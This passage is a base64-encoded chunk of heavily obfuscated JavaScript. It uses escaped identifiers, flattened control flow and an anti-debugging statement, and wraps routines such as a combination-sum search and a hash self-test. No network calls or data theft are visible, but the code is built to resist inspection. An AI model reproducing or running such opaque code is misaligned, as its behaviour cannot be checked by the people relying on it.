NcdTAwNjdcdTAwMzYiXVsiXHg1Zlx4NWZceDVmXHg1Zlx4MzNceDc2XHg3MCJdKy0xNjY6X19fX19fMnB0WyJceDVmXHg1Zlx4NWZceDVmXHgzM1x4NjdceDM2Il1bIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2Nlx1MDA2OFx1MDAzOSJdPV9fX19fX2t5NltfX19fX18zaDFbX19fX3p0cSs3MF0rX19fX19fM2gxW19fX196dHErNzFdXSgpWyJcdTAwNzJcdTAwNjVcdTAwNzBcdTAwNmNcdTAwNjFcdTAwNjMiKyJcdTAwNjUiXShfX19hOWcsIiIpO3JldHVybiBfX19fdnQwPXRydWUsX19fX194cHUoX19fX19maDksX19fX19fdGk1KTtfX19fX18ycHRbIlx4NWZceDVmXHg1Zlx4MzVceDY4XHg2OSJdPV9fX19fXzJwdFsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDc0XHgzNlx4NjYiXSxfX19fenRxKz0tMzUsX19fX19neDYrPTEwOSxfX195MTgrPS0yMDk7YnJlYWs7Y2FzZSAyOigxLF9fX19ieGwpKCk7X19fX19fMnB0WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwMzVcdTAwNjhcdTAwNjkiXT1fX19fX18ycHRbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDAzM1x1MDA2N1x1MDAzNiJdLF9fX19fZ3g2Kz0tMTIwLF9fX3kxOCs9NjM7YnJlYWs7Y2FzZSAyMTA6Y2FzZSBfX19fX18ycHRbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDAzM1x1MDA2N1x1MDAzNiJdWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwMzNcdTAwNzZcdTAwNzAiXSsxMzk6cmV0dXJuIF9fX19feG05O19fX19fXzJwdFsiXHg1Zlx4NWZceDVmXHgzNVx4NjhceDY5Il09X19fX19fMnB0WyJceDVmXHg1Zlx4NWZceDVmXHg2MVx4MzFceDZiIl0sX19fX3p0cSs9LTEwLF9fX19fZ3g2Kz0yNTQsX19feTE4Kz0tNDMwO2JyZWFrO2lmKCEoX19feTE4Pi0oX19fX19neDYrMjg2KSkpe19fX19fXzJwdFsiXHg1Zlx4NWZceDVmXHgzNVx4NjhceDY5Il09X19fX19fMnB0WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwMzNcdTAwNjdcdTAwMzYiXSxfX19fenRxKz00MTcsX19fX19neDYrPS00NDIsX19feTE4Kz0tNDQ7YnJlYWt9Y2FzZSAyMjU6Y2FzZSBfX19fX18ycHRbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDAzM1x1MDA2N1x1MDAzNiJdWyJceDVmXHg1Zlx4NWZceDVmXHgzM1x4NzZceDcwIl0rLTMzMTpbX19fX19fMnB0WyJceDVmXHg1Zlx4NWZceDVmXHgzM1x4NjdceDM2Il1bIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDAzM1x1MDA3Nlx1MDA3MCJdXT1bMTUzXTtfX19fX18ycHRbIlx4NWZceDVmXHg1Zlx4MzVceDY4XHg2OSJdPV9fX19fXzJwdFsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDMyXHUwMDY4XHUwMDY1Il0sX19fX3p0cSs9LTIwMCxfX19fX2d4Nis9LTM2LF9fX3kxOCs9NDY1O2JyZWFrO2lmKCEoX19fX3p0cSE9MjQ5KSl7X19fX19fMnB0WyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwMzVcdTAwNjhcdTAwNjkiXT1fX19fX18ycHRbIlx4NWZceDVmXHg1Zlx4NWZceDMzXHg2N1x4MzYiXSxfX19fenRxKz00NTc7YnJlYWt9fX19fXZhciBfX19fdnQwO3ZhciBfX19fenRxPV9fX19faDZ4KC0xNzEsLTI0Myw0MjMpWyJceDZlXHg2NVx4NzhceDc0Il0oKVsiXHUwMDc2XHUwMDYxXHUwMDZjXHUwMDc1XHUwMDY1Il07aWYoX19fX3Z0MCl7cmV0dXJuIF9fX196dHF9fWZ1bmN0aW9uIF9fX192dDAoKXtmdW5jdGlvbiBfX19fX190aTUoX19fX19fdGk1LF9fX2E5Zyl7Y29uc3QgX19fX194cHU9X19fX19fdGk1Lmxlbmd0aDtjb25zdCBfX19fX2g2eD1fX19hOWcubGVuZ3RoO2xldCBfX19fdnQwPV9fX19fXzNoMVsyXTtpZihfX19fX2g2eD5fX19fX3hwdSl7aWYoIlx4NjFceDUyXHg0NFx4NjhceDU4XHg1MiIgaW4gX19fX19fbHhlKXtfX19fenRxKCl9ZnVuY3Rpb24gX19fX3p0cSgpe2Z1bmN0aW9uKl9fX19fX3RpNShfX19fX190aTUsX19fX194cHUsX19fX19oNngsX19fX3Z0MD17WyJceDVmXHg1Zlx4NWZceDY3XHg3Mlx4NzAiXTp7fX0pe3doaWxlKF9fX19fX3RpNStfX19fX3hwdStfX19fX2g2eCE9PS01KXt3aXRoKF9fX192dDBbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA2ZFx1MDAzNVx1MDA2YSJdfHxfX19fdnQwKXtzd2l0Y2goX19fX19fdGk1K19fX19feHB1K19fX19faDZ4KXtjYXNlIF9fX19fX3RpNS0yMjpjYXNlIDIwMjpfX19fdnQwWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNmRcdTAwMzVcdTAwNmEiXT1fX19fdnQwWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNjdcdTAwNzJcdTAwNzAiXSxfX19fX190aTUrPTcxLF9fX19feHB1Kz03NCxfX19fX2g2eCs9LTEwNDticmVhaztjYXNlIDE1NjpbX19fX3Z0MFsiXHg1Zlx4NWZceDVmXHg2N1x4NzJceDcwIl1bIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg1Zlx4MzJceDYxXHg2MyJdXT1bMTE0XTtfX19ncnBbIlx4NWZceDVmXHg1Zlx4NWZceDM5XHgzNlx4NzciXT1mdW5jdGlvbihfX19fX190aTUsX19fX194cHUpe3JldHVybigxLF9fX2dycFsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDc5XHg2N1x4NzUiXSkoe30sX19fX19fdGk1LF9fX19feHB1KX07X19fZ3JwWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzlcdTAwNjdcdTAwNzUiXT1mdW5jdGlvbihfX19fX190aTUsX19fX194cHUsX19fX19oNngpe3ZhciBfX19fdnQwPXt9O2lmKF9fX19fX3RpNVtfX19fX3hwdStfX19fX2g2eF0hPT1fX19fX18zaDFbMTQzXSlyZXR1cm4gX19fX19fdGk1W19fX19feHB1K19fX19faDZ4XTtpZihfX19fX3hwdT09PV9fX19faDZ4KXJldHVybiBfX19fX18zaDFbNl07Zm9yKHZhciBfX19hOWc9X19fX19fM2gxWzJdO19fX2E5ZzxfX19fX3hwdS5sZW5ndGg7X19fYTlnKyspe2lmKF9fX192dDBbX19fX194cHVbX19fYTlnXV09PT1fX19fX18zaDFbMTQzXSlfX19fdnQwW19fX19feHB1W19fX2E5Z11dPV9fX19fXzNoMVsyXTtpZihfX19fdnQwW19fX19faDZ4W19fX2E5Z11dPT09X19fX19fM2gxWzE0M10pX19fX3Z0MFtfX19fX2g2eFtfX19hOWddXT1fX19fX18zaDFbMl07X19fX3Z0MFtfX19fX3hwdVtfX19hOWddXSsrO19fX192dDBbX19fX19oNnhbX19fYTlnXV0tLX1mb3IodmFyIF9fX196dHEgaW4gX19fX3Z0MCl7aWYoX19fX3Z0MFtfX19fenRxXSE9PV9fX19fXzNoMVsyXSl7X19fX19fdGk1W19fX19feHB1K19fX19faDZ4XT1fX19fX18zaDFbNV07cmV0dXJuIF9fX19fXzNoMVs1XX19Zm9yKHZhciBfX195MTg9X19fX19fM2gxWzFdO19fX3kxODxfX19fX3hwdS5sZW5ndGg7X19feTE4Kyspe2lmKCgxLF9fX2dycFsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDc5XHUwMDY3XHUwMDc1Il0pKF9fX19fX3RpNSxfX19fX3hwdS5zdWJzdHIoX19fX19fM2gxWzJdLF9fX3kxOCksX19fX19oNnguc3Vic3RyKF9fX19fXzNoMVsyXSxfX195MTgpKSYmKDEsX19fZ3JwWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzlcdTAwNjdcdTAwNzUiXSkoX19fX19fdGk1LF9fX19feHB1LnN1YnN0cihfX195MTgpLF9fX19faDZ4LnN1YnN0cihfX195MTgpKXx8KDEsX19fZ3JwWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNzlcdTAwNjdcdTAwNzUiXSkoX19fX19fdGk1LF9fX19feHB1LnN1YnN0cihfX19fX18zaDFbMl0sX19feTE4KSxfX19fX2g2eC5zdWJzdHIoX19fX19oNngubGVuZ3RoLV9fX3kxOCkpJiYoMSxfX19ncnBbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA3OVx1MDA2N1x1MDA3NSJdKShfX19fX190aTUsX19fX194cHUuc3Vic3RyKF9fX3kxOCksX19fX19oNnguc3Vic3RyKF9fX19fXzNoMVsyXSxfX19fX2g2eC5sZW5ndGgtX19feTE4KSkpe19fX19fX3RpNVtfX19fX3hwdStfX19fX2g2eF09X19fX19fM2gxWzZdO3JldHVybiBfX19fX18zaDFbNl19fV9fX19fX3RpNVtfX19fX3hwdStfX19fX2g2eF09X19fX19fM2gxWzVdO3JldHVybiBfX19fX18zaDFbNV19O3JldHVybiBfX19hOWc9dHJ1ZSxjb25zb2xlLmxvZyhfX19ncnBbIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDAzOVx1MDAzNlx1MDA3NyJdKTtfX19fX190aTUrPTI3MixfX19fX3hwdSs9LTQyLF9fX19faDZ4Kz0tMzkxO2JyZWFrO2Nhc2UgX19fX3Z0MFsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDY3XHUwMDcyXHUwMDcwIl1bIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg1Zlx4MzJceDYxXHg2MyJdKy0xNjM6Y2FzZS0zNTpjYXNlIDI4Ol9fX192dDBbIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg2ZFx4MzVceDZhIl09X19fX3Z0MFsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDZhXHUwMDczXHUwMDM4Il0sX19fX19fdGk1Kz0yMTMsX19fX194cHUrPS00NSxfX19fX2g2eCs9Mzc7YnJlYWs7Y2FzZSBfX19fX3hwdSE9MTQ2JiZfX19fX3hwdS0xOTU6W19fX192dDBbIlx4NWZceDVmXHg1Zlx4NjdceDcyXHg3MCJdWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDMyXHg2MVx4NjMiXV09WzUwXTtfX19fdnQwWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNmRcdTAwMzVcdTAwNmEiXT1fX19fdnQwWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNjlcdTAwNjdcdTAwNzgiXSxfX19fX190aTUrPTIxMyxfX19fX3hwdSs9LTE2NCxfX19fX2g2eCs9Mzc7YnJlYWs7Y2FzZSBfX19fX2g2eC0yOTc6Y2FzZSAyMTQ6X19fX3Z0MFsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDZkXHUwMDM1XHUwMDZhIl09X19fX3Z0MFsiXHg1Zlx4NWZceDVmXHg1Zlx4MzJceDY4XHg3MiJdLF9fX19fX3RpNSs9LTIwMSxfX19fX3hwdSs9NDQ1LF9fX19faDZ4Kz0xNDE7YnJlYWs7Y2FzZS0yMzg6Y2FzZS0yMTI6Y2FzZSBfX19fX3hwdS0gLTE4NjpfX19fdnQwWyJceDVmXHg1Zlx4NWZceDVmXHg1Zlx4NmRceDM1XHg2YSJdPV9fX192dDBbIlx4NWZceDVmXHg1Zlx4NWZceDYzXHg2OFx4NjMiXSxfX19fX190aTUrPS0yNzIsX19fX194cHUrPTIyMSxfX19fX2g2eCs9MTQxO2JyZWFrO2lmKF9fX19feHB1IT0tKF9fX19fX3RpNSsyKSl7X19fX3Z0MFsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDZkXHUwMDM1XHUwMDZhIl09X19fX3Z0MFsiXHg1Zlx4NWZceDVmXHg2N1x4NzJceDcwIl0sX19fX19fdGk1Kz0tNzEsX19fX194cHUrPS0yMjQ7YnJlYWt9ZGVmYXVsdDpjYXNlIDg1OmNhc2UgX19fX3Z0MFsiXHg1Zlx4NWZceDVmXHg2N1x4NzJceDcwIl1bIlx4NWZceDVmXHg1Zlx4NWZceDVmXHg1Zlx4MzJceDYxXHg2MyJdKy0xNzE6X19fX3Z0MFsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDZkXHUwMDM1XHUwMDZhIl09X19fX3Z0MFsiXHUwMDVmXHUwMDVmXHUwMDVmXHUwMDYyXHUwMDZhXHUwMDc0Il0sX19fX19fdGk1Kz0tNjMsX19fX194cHUrPTEzNSxfX19fX2g2eCs9MTQxO2JyZWFrO2Nhc2UgX19fX194cHUtIC00NzpbX19fX3Z0MFsiXHg1Zlx4NWZceDVmXHg2N1x4NzJceDcwIl1bIlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDA1Zlx1MDAzMlx1MDA2MVx1MDA2MyJdXT1bLTE4M107X19fX3Z0MFsiXHg1Zlx4NWZceDVmXHg1Zlx4NWZceDZkXHgzNVx4NmEiXT1fX19fdnQwWyJcdTAwNWZcdTAwNWZcdTAwNWZcdTAwNmRcdTAwMzRcdTAwMzgiXSxfX19fX190aTUrPS0yOSxfX19fX3hwdSs9MTcsX19fX19oNngrPTM3O2JyZWFrfX19fXZhciBfX19hOWc7dmFyIF9fX19feHB1PV9fX19fX3RpNSgtMTU0LDEwMSwyMDkpWyJceDZlXHg2NVx4NzhceDc0Il0oKVsiXHUwMDc2XHUwMDYxXHUwMDZjXHUwMDc1XHUwMDY1Il07aWYoX19fYTlnKXtyZXR1cm4gX19fX194cHV9fWRlYnVnZ2VyO3JldHVybi1fX19fX18zaDFbMV19Zm9yKGxldCBfX19fX2d4Nj1fX19fX18zaDFbMl07X19fX19neDY8PV9fX19feHB1LV9fX19faDZ4O19fX19fZ3g2Kyspe2lmKCJcdTAwNjNcdTAwNTFcdTAwNzZcdTAwNDdcdTAwNWZcdTAwNzUiIGluIF9fX19fX2x4ZSl7X19feTE4KCl9ZnVuY3Rpb24gX19feTE4KCl7dmFyIF9fX19fX3RpNT1mdW5jdGlvbihfX19fX190aTUsX19fX19oNngpe3ZhciBfX19fdnQwPVtdO3ZhciBfX19fenRxPV9fX19fX3RpNS5sZW5ndGg7X19fX19fdGk1LnNvcnQoKF9fX19fX3RpNSxfX19fX2g2eCk9Pl9fX19fX3RpNS1fX19fX2g2eCk7X19fYTlnKF9fX192dDAsW10sX19fX19fM2gxWzJdLF9fX196dHEsX19fX19fdGk1LF9fX19faDZ4KTtyZXR1cm4gX19fX3Z0MH07dmFyIF9fX2E5Zz1mdW5jdGlvbihfX19fX190aTUsX19fX19oNngsX19fX3Z0MCxfX19fenRxLF9fX3kxOCxfX19fX18ycHQpe3ZhciBfX19fX25pND1fX19fX18zaDFbM107aWYoX19fX19fMnB0PF9fX19fXzNoMVsyXSlyZXR1cm47aWYoX19fX19fMnB0PT09X19fX19fM2gxWzJdKXJldHVybiBfX19fX190aTUucHVzaChfX19fX2g2eCk7Zm9yKHZhciBfX19fX3RpMj1fX19fdnQwO19fX19fdGkyPF9fX196dHE7X19fX190aTIrKyl7aWYoX19feTE4W19fX19fdGkyXT5fX19fX18ycHQpYnJlYWs7aWYoX19fX190aTI+X19fX3Z0MCYmX19feTE4W19fX19fdGkyXT09PV9fX3kxOFtfX19fX3RpMi1fX19fX18zaDFbMV1dKWNvbnRpbnVlO19fX19fbmk0PUFycmF5LmZyb20oX19fX19oNngpO19fX19fbmk0LnB1c2goX19feTE4W19fX19fdGkyXSk7X19fYTlnKF9fX19fX3RpNSxfX19fX25pNCxfX19fX3RpMitfX19fX18zaDFbMV0sX19fX3p0cSxfX195MTgsX19fX19fMnB0LV9fX3kxOFtfX19fX3RpMl0pfX07Y29uc29sZS5sb2coX19fX19fdGk1KX1mb3IobGV0IF9fX19fXzJwdD1fX19fX18zaDFbMl07X19fX19fMnB0PF9fX19faDZ4O19fX19fXzJwdCsrKXtpZigiXHUwMDQyXHUwMDcyXHUwMDM5XHUwMDY5XHUwMDY0XHUwMDU5IiBpbiBfX19fX19seGUpe19fX19fbmk0KCl9ZnVuY3Rpb24gX19fX19uaTQoKXt2YXIgX19fX19fdGk1PWZ1bmN0aW9uKCl7dmFyIF9fX19fX3RpNT1fX19fX18zaDFbMl07dmFyIF9fX2E5Zz0iIjtmdW5jdGlvbiBfX19fX2g2eChfX19fX190aTUpe3JldHVybiBfX19fX21lbChfX19fX2E4OChfX19fX18zY3koX19fX19fdGk1KSkpfWZ1bmN0aW9uIF9fX192dDAoX19fX19fdGk1KXtyZXR1cm4gX19fX19fbmtiKF9fX19fYTg4KF9fX19fXzNjeShfX19fX190aTUpKSl9ZnVuY3Rpb24gX19fX3p0cShfX19fX190aTUsX19fYTlnKXtyZXR1cm4gX19femZuKF9fX19fYTg4KF9fX19fXzNjeShfX19fX190aTUpKSxfX19hOWcpfWZ1bmN0aW9uIF9fX3kxOChfX19fX190aTUsX19fYTlnKXtyZXR1cm4gX19fX19tZWwoX19fX19fbHhlKF9fX19fXzNjeShfX19fX190aTUpLF9fX19fXzNjeShfX19hOWcpKSl9ZnVuY3Rpb24gX19fX19uaTQoX19fX19fdGk1LF9fX2E5Zyl7cmV0dXJuIF9fX19fX25rYihfX19fX19seGUoX19fX19fM2N5KF9fX19fX3RpNSksX19fX19fM2N5KF9fX2E5ZykpKX1mdW5jdGlvbiBfX19fX3RpMihfX19fX190aTUsX19fYTlnLF9fX19faDZ4KXtyZXR1cm4gX19femZuKF9fX19fX2x4ZShfX19fX18zY3koX19fX19fdGk1KSxfX19fX18zY3koX19fYTlnKSksX19fX19oNngpfWZ1bmN0aW9uIF9fX19hZWQoKXtyZXR1cm4gX19fX19oNngoX19fX19fM2gxWzMxXSkudG9Mb3dlckNhc2UoKT09Ilx1MDA2Mlx1MDA2MVx1MDAzN1x1MDAzOFx1MDAzMVx1MDAzNlx1MDA2Mlx1MDA2Nlx1MDAzOFx1MDA2Nlx1MDAzMFx1MDAzMVx1MDA2M1x1MDA2Nlx1MDA2NVx1MDA2MSIrIlx1MDAzNFx1MDAzMVx1MDAzNFx1MDAzMVx1MDAzNFx1MDAzMFx1MDA2NFx1MDA2NVx1MDAzNVx1MDA2NFx1MDA2MVx1MDA2NVx1MDAzMlx1MDAzMlx1MDAzMlx1MDAzMyIrIlx4NjJceDMwXHgzMFx4MzNceDM2XHgzMVx4NjFceDMzXHgzOVx4MzZceDMxXHgzN1x4MzdceDYxXHgzOVx4NjMiKyJcdTAwNjJcdTAwMzRcdTAwMzFcdTAwMzBcdTAwNjZcdTAwNjZcdTAwMzZcdTAwMzFcdTAwNjZcdTAwMzJcdTAwMzBcdTAwMzBcdTAwMzFcdTAwMzVcdTAwNjFcdTAwNjQifWZ1bmN0aW9uIF9fX19fYTg4KF9fX19fX3RpNSl7cmV0dXJuIF9fX19zbXkoX19fX19hYzQoX19fX19feHlyKF9fX19fX3RpNSksX19fX19fdGk1Lmxlbmd0aCpfX19fX18zaDFbN10pKX1mdW5jdGlvbiBfX19fX19seGUoX19fX19fdGk1LF9fX2E5Zyl7dmFyIF9fX19faDZ4PV9fX19fX3h5cihfX19fX190aTUpO2lmKF9fX19faDZ4Lmxlbmd0aD5fX19fX18zaDFbOF0pX19fX19oNng9X19fX19hYzQoX19fX19oNngsX19fX19fdGk1Lmxlbmd0aCpfX19fX18zaDFbN10pO3ZhciBfX19fdnQwPUFycmF5KF9fX19fXzNoMVs4XSksX19fX3p0cT1BcnJheShfX19fX18zaDFbOF0pO2Zvcih2YXIgX19feTE4PV9fX19fXzNoMVsyXTtfX195MTg8X19fX19fM2gxWzhdO19fX3kxOCsrKXtfX19fdnQwW19fX3kxOF09X19fX19oNnhbX19feTE4XV5fX19fX18zaDFbMzNdO19fX196dHFbX19feTE4XT1fX19fX2g2eFtfX195MThdXl9fX19fXzNoMVszNF19dmFyIF9fX19fbmk0PV9fX19fYWM0KF9fX192dDAuY29uY2F0KF9fX19fX3h5cihfX19hOWcpKSxfX19fX18zaDFbMTFdK19fX2E5Zy5sZW5ndGgqX19fX19fM2gxWzddKTtyZXR1cm4gX19fX3NteShfX19fX2FjNChfX19fenRxLmNvbmNhdChfX19fX25pNCksX19fX19fa3k2KF9fX19fXzNoMVs5XStfX19fX18zaDFbMTBdLF9fX19fXzNoMVsxMV0sX19fX19fM2gxWzEyXSkpKX1mdW5jdGlvbiBfX19fX21lbChfX19hOWcpe3RyeXtfX19fX190aTV9Y2F0Y2goX19fX19oNngpe19fX19fX3RpNT1fX19fX18zaDFbMl19dmFyIF9fX192dDA9X19fX19fdGk1P19fX19fXzNoMVsxM10rX19fX19fM2gxWzM1XStfX19fX18zaDFbMzZdOl9fX19fXzNoMVsxM10rX19fX19fM2gxWzM3XStfX19fX18zaDFbMzhdO3ZhciBfX19fenRxPSIiO3ZhciBfX195MTg7Zm9yKHZhciBfX19fX25pND1fX19fX18zaDFbMl07X19fX19uaTQ8X19fYTlnLmxlbmd0aDtfX19fX25pNCsrKXtfX195MTg9X19fYTlnLmNoYXJDb2RlQXQoX19fX19uaTQpO19fX196dHErPV9fX192dDAuY2hhckF0KF9fX3kxOD4+Pl9fX19fXzNoMVsxNl0mX19fX19fM2gxWzE0XSkrX19fX3Z0MC5jaGFyQXQoX19feTE4Jl9fX19fXzNoMVsxNF0pfXJldHVybiBfX19fenRxfWZ1bmN0aW9uIF9fX19fX25rYihfX19fX190aTUpe3RyeXtfX19hOWd9Y2F0Y2goX19fX19oNngpe19fX2E5Zz0iIn12YXIgX19fX3Z0MD1fX19fX18zaDFbMTQ0XStfX19fX18zaDFbMTQ1XStfX19fX18zaDFbMTQ2XStfX19fX18zaDFbMTQ3XStfX19fX18zaDFbMTQ4XStfX19fX18zaDFbMTQ5XStfX19fX18zaDFbMTUwXStfX19fX18zaDFbMTQyXTt2YXIgX19fX3p0cT0iIjt2YXIgX19feTE4PV9fX19fX3RpNS5sZW5ndGg7Zm9yKHZhciBfX19fX25pND1fX19fX18zaDFbMl07X19fX19uaTQ8X19feTE4O19fX19fbmk0Kz1fX19fX18zaDFbMTVdKXt2YXIgX19fX190aTI9X19fX19fdGk1LmNoYXJDb2RlQXQoX19fX19uaTQpPDxfX19fX18zaDFbOF18KF9fX19fbmk0K19fX19fXzNoMVsxXTxfX195MTg/X19fX19fdGk1LmNoYXJDb2RlQXQoX19fX19uaTQrX19fX19fM2gxWzFdKTw8X19fX19fM2gxWzddOl9fX19fXzNoMVsyXSl8KF9fX19fbmk0K19fX19fXzNoMVswXTxfX195MTg/X19fX19fdGk1LmNoYXJDb2RlQXQoX19fX19uaTQrX19fX19fM2gxWzBdKTpfX19fX18zaDFbMl0pO2Zvcih2YXIgX19fX2FlZD1fX19fX18zaDFbMl07X19fX2FlZDxfX19fX18zaDFbMTZdO19fX19hZWQrKyl7aWYoX19fX19uaTQqX19fX19fM2gxWzddK19fX19hZWQqX19fX19fM2gxWzE3XT5fX19fX190aTUubGVuZ3RoKl9fX19fXzNoMVs3XSlfX19fenRxKz1fX19hOWc7ZWxzZSBfX19fenRxKz1fX19fdnQwLmNoYXJBdChfX19fX3RpMj4+Pl9fX19fXzNoMVsxN10qKF9fX19fXzNoMVsxNV0tX19fX2FlZCkmX19fX19fM2gxWzE5XSl9fXJldHVybiBfX19fenRxfWZ1bmN0aW9uIF9fX3pmbihfX19fX190aTUsX19fYTlnKXt2YXIgX19fX19oNng9X19fYTlnLmxlbmd0aDt2YXIgX19fX3Z0MD1BcnJheSgpO3ZhciBfX19fenRxLF9fX3kxOCxfX19fX25pNCxfX19fX3RpMjt2YXIgX19fX2FlZD1BcnJheShNYXRoLmNlaWwoX19fX19fdGk1Lmxlbmd0aC9fX19fX18zaDFbMF0pKTtmb3IoX19fX3p0cT1fX19fX18zaDFbMl07X19fX3p0cTxfX19fYWVkLmxlbmd0aDtfX19fenRxKyspe19fX19hZWRbX19fX3p0cV09X19fX19fdGk1LmNoYXJDb2RlQXQoX19fX3p0cSpfX19fX18zaDFbMF0pPDxfX19fX18zaDFbN118X19fX19fdGk1LmNoYXJDb2RlQXQoX19fX3p0cSpfX19fX18zaDFbMF0rX19fX19fM2gxWzFdKX13aGlsZShfX19fYWVkLmxlbmd0aD5fX19fX18zaDFbMl0pe19fX19fdGkyPUFycmF5KCk7X19fX19uaTQ9X19fX19fM2gxWzJdO2ZvcihfX19fenRxPV9fX19fXzNoMVsyXTtfX19fenRxPF9fX19hZWQubGVuZ3RoO19fX196dHErKyl7X19fX19uaTQ9KF9fX19fbmk0PDxfX19fX18zaDFbOF0pK19fX19hZWRbX19fX3p0cV07X19feTE4PU1hdGguZmxvb3IoX19fX19uaTQvX19fX19oNngpO19fX19fbmk0LT1fX195MTgqX19fX19oNng7aWYoX19fX190aTIubGVuZ3RoPl9fX19fXzNoMVsyXXx8X19feTE4Pl9fX19fXzNoMVsyXSlfX19fX3RpMltfX19fX3RpMi5sZW5ndGhdPV9fX3kxOH1fX19fdnQwW19fX192dDAubGVuZ3RoXT1fX19fX25pNDtfX19fYWVkPV9fX19fdGkyfXZhciBfX19fX2E4OD0iIjtmb3IoX19fX3p0cT1fX19fdnQwLmxlbmd0aC1fX19fX18zaDFbMV07X19fX3p0cT49X19fX19fM2gxWzJdO19fX196dHEtLSlfX19fX2E4OCs9X19fYTlnLmNoYXJBdChfX19fdnQwW19fX196dHFdKTt2YXIgX19fX19fbHhlPU1hdGguY2VpbChfX19fX190aTUubGVuZ3RoKl9fX19fXzNoMVs3XS8oTWF0aC5sb2coX19fYTlnLmxlbmd0aCkvTWF0aC5sb2coX19fX19fM2gxWzBdKSkpO2ZvcihfX19fenRxPV9fX19fYTg4Lmxlbmd0aDtfX19fenRxPF9fX19fX2x4ZTtfX19fenRxKyspX19fX19hODg9X19fYTlnW19fX19fXzNoMVsyXV0rX19fX19hODg7cmV0dXJuIF9fX19fYTg4fWZ1bmN0aW9uIF9fX19fXzNjeShfX19fX190aTUpe3ZhciBfX19hOWc9IiI7dmFyIF9fX19faDZ4PS1fX19fX18zaDFbMV07dmFyIF9fX192dDAsX19fX3p0cTt3aGlsZSgrK19fX19faDZ4PF9fX19fX3RpNS5sZW5ndGgpe19fX192dDA9X19fX19fdGk1LmNoYXJDb2RlQXQoX19fX19oNngpO19fX196dHE9X19fX19oNngrX19fX19fM2gxWzFdPF9fX19fX3RpNS5sZW5ndGg/X19fX19fdGk1LmNoYXJDb2RlQXQoX19fX19oNngrX19fX19fM2gxWzFdKTpfX19fX18zaDFbMl07aWYoX19fX19fM2gxWzM5XTw9X19fX3Z0MCYmX19fX3Z0MDw9X19fX19fM2gxWzQwXSYmX19fX19fM2gxWzQxXTw9X19fX3p0cSYmX19fX3p0cTw9X19fX19fM2gxWzQyXSl7X19fX3Z0MD1fX19fX18zaDFbNDNdKygoX19fX3Z0MCZfX19fX18zaDFbMThdKTw8X19fX19fM2gxWzRdKSsoX19fX3p0cSZfX19fX18zaDFbMThdKTtfX19fX2g2eCsrfWlmKF9fX192dDA8PV9fX19fXzNoMVs0NF0pX19fYTlnKz1TdHJpbmcuZnJvbUNoYXJDb2RlKF9fX192dDApO2Vsc2UgaWYoX19fX3Z0MDw9X19fX19fM2gxWzQ1XSlfX19hOWcrPVN0cmluZy5mcm9tQ2hhckNvZGUoX19fX19fM2gxWzQ2XXxfX19fdnQwPj4+X19fX19fM2gxWzE3XSZfX19fX18zaDFbNDddLF9fX19fXzNoMVsyMF18X19fX3Z0MCZfX19fX18zaDFbMTldKTtlbHNlIGlmKF9fX192dDA8PV9fX19fXzNoMVszMF0pX19fYTlnKz1TdHJpbmcuZnJvbUNoYXJDb2RlKF9fX19fXzNoMVs0OF18X19fX3Z0MD4+Pl9fX19fXzNoMVsyMV0mX19fX19fM2gxWzE0XSxfX19fX18zaDFbMjBdfF9fX192dDA+Pj5fX19fX18zaDFbMTddJl9fX19fXzNoMVsxOV0sX19fX19fM2gxWzIwXXxfX19fdnQwJl9fX19fXzNoMVsxOV0pO2Vsc2UgaWYoX19fX3Z0MDw9X19fX19fM2gxWzQ5XSlfX19hOWcrPVN0cmluZy5mcm9tQ2hhckNvZGUoX19fX19fM2gxWzUwXXxfX19fdnQwPj4+X19fX19fM2gxWzI3XSZfX19fX18zaDFbMjZdLF9fX19fXzNoMVsyMF18X19fX3Z0MD4+Pl9fX19fXzNoMVsyMV0mX19fX19fM2gxWzE5XSxfX19fX18zaDFbMjBdfF9fX192dDA+Pj5fX19fX18zaDFbMTddJl9fX19fXzNoMVsxOV0sX19fX19fM2gxWzIwXXxfX19fdnQwJl9fX19fXzNoMVsxOV0pfXJldHVybiBfX19hOWd9ZnVuY3Rpb24gX19fZWM3KF9fX19fX3RpNSl7dmFyIF9fX2E5Zz0iIjtmb3IodmFyIF9fX19faDZ4PV